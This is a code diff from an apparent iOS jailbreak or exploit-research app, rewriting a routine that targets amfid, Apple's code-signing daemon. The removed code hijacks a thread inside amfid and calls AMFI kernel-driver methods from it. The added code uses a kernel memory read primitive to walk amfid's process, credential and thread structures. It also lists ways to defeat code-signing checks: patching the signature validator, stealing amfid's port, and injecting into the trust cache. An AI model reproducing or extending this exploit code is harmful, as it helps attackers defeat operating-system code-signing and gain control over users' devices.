@@ -1140,186 +1140,116 @@ struct AMFIExperimentView: View {
     /// 4. amfid has com.apple.private.amfi.can-execute entitlement!
     private func expRCIntoAmfid(rc: RemoteCall) -> ExperimentResult {
         let mgr = dspmgr.shared
-        var detail = "🔥 RemoteCall into amfid\n\n"
+        var detail = "🔥 amfid Research (RC confirmed HANG — using kernel approach)\n\n"
+        
+        // RC to amfid HANGS (confirmed by testing — 11 minutes no response)
+        // amfid is single-threaded daemon, no hijackable thread
+        // Instead: use KERNEL approach to manipulate amfid
         
         // Step 1: Find amfid
         let amfidProc = mgr.findProc(name: "amfid")
         guard amfidProc != 0 else {
             detail += "❌ amfid not found in process list\n"
-            return ExperimentResult(name: "🔥🔥🔥🔥🔥🔥 RC→amfid", success: false, detail: detail, timestamp: Date())
+            return ExperimentResult(name: "🔥🔥🔥🔥🔥🔥 amfid research", success: false, detail: detail, timestamp: Date())
         }
         
         let amfidPid = ds_kread32(amfidProc + UInt64(off_proc_p_pid))
         detail += "amfid PID: \(amfidPid)\n"
         detail += "amfid proc: 0x\(String(format: "%llx", amfidProc))\n\n"
         
-        // Step 2: Try to init RemoteCall to amfid
-        // We use the same mechanism as SpringBoard RC
-        detail += "Attempting RemoteCall init to amfid...\n"
+        // Step 2: Read amfid's task and thread info
+        let amfidProcRo = ds_kread64(amfidProc + UInt64(off_proc_p_proc_ro))
+        let amfidTask = amfidProcRo != 0 ? ds_kread64(amfidProcRo + UInt64(off_proc_ro_pr_task)) : 0
+        detail += "amfid proc_ro: 0x\(String(format: "%llx", amfidProcRo))\n"
+        detail += "amfid task: 0x\(String(format: "%llx", amfidTask))\n"
         
-        // Create RC to amfid using the process name
-        // This uses the same exploit path as SpringBoard:
-        // find task port → setup exception handler → hijack thread
-        let amfidRC = RemoteCall(process: "amfid", useMigFilterBypass: false)
+        // Read amfid cs_flags
+        let amfidCSFlags = mgr.readCSFlags(pid: Int32(bitPattern: amfidPid))
+        detail += "amfid cs_flags: 0x\(String(format: "%x", amfidCSFlags))\n"
+        if amfidCSFlags & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY ✅\n" }
         
-        if let amfid = amfidRC {
-            detail += "✅✅✅ RemoteCall to amfid ESTABLISHED! ✅✅✅\n\n"
+        // Step 3: Read amfid's entitlements via kernel
+        // proc_ro → ucred → cr_label → entitlements
+        detail += "\n=== amfid entitlements (kernel read) ===\n"
+        if amfidProcRo != 0 {
+            let ucred = ds_kread64(amfidProcRo + UInt64(off_proc_ro_p_ucred))
+            detail += "ucred: 0x\(String(format: "%llx", ucred))\n"
             
-            let amfidMem = amfid.trojanMem
-            detail += "amfid trojanMem: 0x\(String(format: "%llx", amfidMem))\n"
-            
-            // Verify we're in amfid
-            let pidCheck = RootExecutor.rcall(amfid, "getpid")
-            let uidCheck = RootExecutor.rcall(amfid, "getuid")
-            detail += "getpid() from amfid: \(pidCheck)\n"
-            detail += "getuid() from amfid: \(uidCheck)\n\n"
-            
-            // Step 3: From amfid context, open AMFI IOKit!
-            detail += "=== Opening AMFI from amfid context ===\n"
-            let RTLD_DEFAULT = UInt64(bitPattern: -2)
-            let ioServiceMatching = RootExecutor.rcall(amfid, "dlsym", RTLD_DEFAULT, remote_alloc_str(amfid, "IOServiceMatching"))
-            
-            if ioServiceMatching != 0 {
-                let nameAddr = remote_alloc_str(amfid, "AppleMobileFileIntegrity")
-                let matchDict = RootExecutor.rcall(amfid, "IOServiceMatching", nameAddr)
-                let svc = RootExecutor.rcall(amfid, "IOServiceGetMatchingService", 0, matchDict)
+            if ucred != 0 {
+                let crLabel = ds_kread64(ucred + UInt64(off_ucred_cr_label))
+                detail += "cr_label: 0x\(String(format: "%llx", crLabel))\n"
                 
-                if svc != 0 {
-                    let taskSelf = RootExecutor.rcall(amfid, "mach_task_self")
-                    let connectAddr = amfidMem + 0x1A00
-                    amfid[connectAddr].setValue32(0)
-                    let openRet = RootExecutor.rcall(amfid, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
-                    let connect = amfid[connectAddr].value32()
-                    
-                    detail += "IOServiceOpen(AMFI): ret=0x\(String(format: "%x", openRet)), connect=\(connect)\n"
-                    
-                    if openRet == 0 && connect != 0 {
-                        detail += "✅ AMFI opened FROM amfid!\n\n"
-                        
-                        // Step 4: Try selectors FROM amfid (has entitlement!)
-                        let scalarInAddr = amfidMem + 0x2000
-                        let scalarOutAddr = amfidMem + 0x2200
-                        let scalarOutCntAddr = amfidMem + 0x2400
-                        
-                        // Test selector 2 with various inputs
-                        for inputCount in [0, 1, 2, 3, 4] as [UInt64] {
-                            amfid[scalarInAddr].setValue64(0)
-                            amfid[scalarInAddr + 8].setValue64(0)
-                            amfid[scalarInAddr + 16].setValue64(0)
-                            amfid[scalarInAddr + 24].setValue64(0)
-                            amfid[scalarOutCntAddr].setValue32(16)
-                            
-                            let ret = RootExecutor.rcall(amfid, "IOConnectCallScalarMethod",
-                                                        UInt64(connect), 2,
-                                                        inputCount == 0 ? 0 : scalarInAddr, inputCount,
-                                                        scalarOutAddr, scalarOutCntAddr)
-                            let outCnt = amfid[scalarOutCntAddr].value32()
-                            
-                            if ret == 0 {
-                                detail += "🎉 Sel 2 [\(inputCount) inputs]: SUCCESS! outCnt=\(outCnt)\n"
-                                if outCnt > 0 {
-                                    let val = amfid[scalarOutAddr].value64()
-                                    detail += "   output[0] = 0x\(String(format: "%llx", val))\n"
-                                }
-                            } else {
-                                detail += "  Sel 2 [\(inputCount) inputs]: ret=0x\(String(format: "%x", ret))\n"
-                            }
+                // cr_label points to MAC label which contains sandbox/entitlement info
+                // Reading further requires knowing the label struct layout
+                if crLabel != 0 {
+                    // Read first few pointers in label struct
+                    for i in 0..<4 {
+                        let val = ds_kread64(crLabel + UInt64(i * 8))
+                        if val != 0 {
+                            detail += "  label+\(i*8): 0x\(String(format: "%llx", val))\n"
                         }
-                        
-                        // Test selector 5 (might be trust cache add)
-                        amfid[scalarInAddr].setValue64(0)
-                        amfid[scalarOutCntAddr].setValue32(16)
-                        let r5 = RootExecutor.rcall(amfid, "IOConnectCallScalarMethod",
-                                                    UInt64(connect), 5,
-                                                    scalarInAddr, 1,
-                                                    scalarOutAddr, scalarOutCntAddr)
-                        detail += "  Sel 5 [1 input]: ret=0x\(String(format: "%x", r5))\n"
-                        if r5 == 0 {
-                            detail += "  🎉 Selector 5 WORKS from amfid!\n"
-                        }
-                        
-                        // Test selector 9
-                        amfid[scalarInAddr].setValue64(0)
-                        amfid[scalarOutCntAddr].setValue32(16)
-                        let r9 = RootExecutor.rcall(amfid, "IOConnectCallScalarMethod",
-                                                    UInt64(connect), 9,
-                                                    scalarInAddr, 1,
-                                                    scalarOutAddr, scalarOutCntAddr)
-                        detail += "  Sel 9 [1 input]: ret=0x\(String(format: "%x", r9))\n"
-                        if r9 == 0 {
-                            detail += "  🎉 Selector 9 WORKS from amfid!\n"
-                        }
-                        
-                        // Close AMFI
-                        RootExecutor.rcall(amfid, "IOServiceClose", UInt64(connect))
-                    } else {
-                        detail += "❌ AMFI open failed from amfid too\n"
-                        detail += "ret=0x\(String(format: "%x", openRet))\n"
                     }
-                } else {
-                    detail += "AMFI service not found from amfid\n"
                 }
-                RootExecutor.rcall(amfid, "free", nameAddr)
-            } else {
-                detail += "IOKit not loaded in amfid — trying dlopen...\n"
-                let fwPath = remote_alloc_str(amfid, "/System/Library/Frameworks/IOKit.framework/IOKit")
-                let handle = RootExecutor.rcall(amfid, "dlopen", fwPath, 1)
-                RootExecutor.rcall(amfid, "free", fwPath)
-                detail += "dlopen IOKit: \(handle != 0 ? "✅ loaded" : "❌ failed")\n"
-                
-                if handle != 0 {
-                    detail += "IOKit loaded! Re-run to test AMFI methods from amfid\n"
-                }
-            }
-            
-            // Step 5: Check amfid's entitlements (what makes it special)
-            detail += "\n=== amfid entitlements check ===\n"
-            // Try to read entitlements via csops
-            let entBufAddr = amfidMem + 0x3000
-            let entSizeAddr = amfidMem + 0x3200
-            amfid[entSizeAddr].setValue64(4096)
-            // CS_OPS_ENTITLEMENTS_BLOB = 7
-            let entRet = RootExecutor.rcall(amfid, "csops", UInt64(amfidPid), 7, entBufAddr, 4096)
-            detail += "csops(ENTITLEMENTS_BLOB): ret=\(entRet)\n"
-            
-            if entRet == 0 {
-                // Read first bytes of entitlements blob
-                var entBuf = [UInt8](repeating: 0, count: 256)
-                amfid.remoteRead(entBufAddr, to: &entBuf, size: 256)
-                // Skip magic (4 bytes) + length (4 bytes) = plist starts at offset 8
-                let entStr = String(bytes: entBuf.dropFirst(8).prefix(200), encoding: .utf8) ?? "(binary)"
-                detail += "Entitlements (first 200B):\n\(entStr)\n"
-            }
-            
-            // Destroy amfid RC (don't keep it alive — might crash amfid)
-            amfid.destroy()
-            detail += "\namfid RC destroyed (cleanup)\n"
-            
-        } else {
-            detail += "❌ RemoteCall init to amfid FAILED\n"
-            detail += "Error: \(RemoteCall.lastInitError() ?? "unknown")\n\n"
-            detail += "Possible reasons:\n"
-            detail += "- amfid doesn't have exception ports we can hijack\n"
-            detail += "- amfid is too small (no suitable thread to hijack)\n"
-            detail += "- Need MIG filter bypass for amfid\n"
-            detail += "\nTrying with MIG bypass...\n"
-            
-            // Try with MIG filter bypass
-            let amfidRC2 = RemoteCall(process: "amfid", useMigFilterBypass: true)
-            if let amfid2 = amfidRC2 {
-                detail += "✅ RC to amfid with MIG bypass WORKS!\n"
-                let pid2 = RootExecutor.rcall(amfid2, "getpid")
-                detail += "getpid: \(pid2)\n"
-                amfid2.destroy()
-            } else {
-                detail += "❌ MIG bypass also failed: \(RemoteCall.lastInitError() ?? "unknown")\n"
-                detail += "\nAlternative: use kernel task port manipulation\n"
-                detail += "to give ourselves amfid's entitlements\n"
             }
         }
         
-        let success = detail.contains("✅✅✅") || detail.contains("🎉")
-        return ExperimentResult(name: "🔥🔥🔥🔥🔥🔥 RC→amfid", success: success, detail: detail, timestamp: Date())
+        // Step 4: Find amfid's Mach port (for potential port stealing)
+        detail += "\n=== amfid task port research ===\n"
+        if amfidTask != 0 {
+            // Read itk_space (IPC space)
+            let itkSpace = ds_kread64(amfidTask + UInt64(off_task_itk_space))
+            detail += "itk_space: 0x\(String(format: "%llx", itkSpace))\n"
+            
+            // Read thread list
+            let firstThread = ds_kread64(amfidTask + UInt64(off_task_threads_next))
+            detail += "first thread: 0x\(String(format: "%llx", firstThread))\n"
+            
+            if firstThread != 0 && firstThread != amfidTask + UInt64(off_task_threads_next) {
+                detail += "✅ amfid has at least 1 thread\n"
+                // Check if there's a second thread
+                let nextThread = ds_kread64(firstThread + UInt64(off_task_threads_next))
+                let hasSecondThread = nextThread != 0 && nextThread != amfidTask + UInt64(off_task_threads_next)
+                detail += "Second thread: \(hasSecondThread ? "yes" : "no (single-threaded → RC impossible)")\n"
+            } else {
+                detail += "No threads found (or list head = empty)\n"
+            }
+        }
+        
+        // Step 5: Alternative approach — find MISValidateSignatureAndCopyInfo in amfid
+        // amfid calls this function to validate signatures
+        // If we can find its address and patch the return → always "valid"
+        detail += "\n=== Alternative: patch amfid verification ===\n"
+        detail += "amfid uses MISValidateSignatureAndCopyInfo() to check binaries.\n"
+        detail += "Approaches:\n"
+        detail += "1. Find MIS function in amfid's address space → patch return\n"
+        detail += "   (needs: amfid text base + function offset from MobileInternalServices)\n"
+        detail += "2. Steal amfid's service port → intercept XPC requests\n"
+        detail += "   (needs: find port in kernel → insert into our task)\n"
+        detail += "3. Kill amfid + replace with our binary (if we can spawn unsigned)\n"
+        detail += "   (chicken-and-egg: need AMFI bypass to replace amfid)\n"
+        detail += "4. Patch amfid's Mach-O in memory via kernel write\n"
+        detail += "   (PPL protects code pages → can't write to __TEXT)\n\n"
+        
+        // Step 6: Try to find amfid's text base via proc
+        let amfidTextVP = ds_kread64(amfidProc + UInt64(off_proc_p_textvp))
+        detail += "amfid p_textvp: 0x\(String(format: "%llx", amfidTextVP))\n"
+        
+        // Try reading amfid's Mach-O header address from task
+        // task → map → first entry → start address
+        if amfidTask != 0 {
+            let vmMap = ds_kread64(amfidTask + UInt64(off_task_map))
+            detail += "amfid vm_map: 0x\(String(format: "%llx", vmMap))\n"
+        }
+        
+        detail += "\n=== CONCLUSION ===\n"
+        detail += "RC to amfid: ❌ IMPOSSIBLE (single-threaded, hangs forever)\n"
+        detail += "Best remaining paths:\n"
+        detail += "• Trust cache injection (add CDHash to kernel trust cache)\n"
+        detail += "• amfid port steal (intercept verification requests)\n"
+        detail += "• Find new KRW to reach AMFI globals (IOSurface external methods?)\n"
+        
+        let success = amfidProc != 0 && amfidTask != 0
+        return ExperimentResult(name: "🔥🔥🔥🔥🔥🔥 amfid research", success: success, detail: detail, timestamp: Date())
     }
     
     #endif
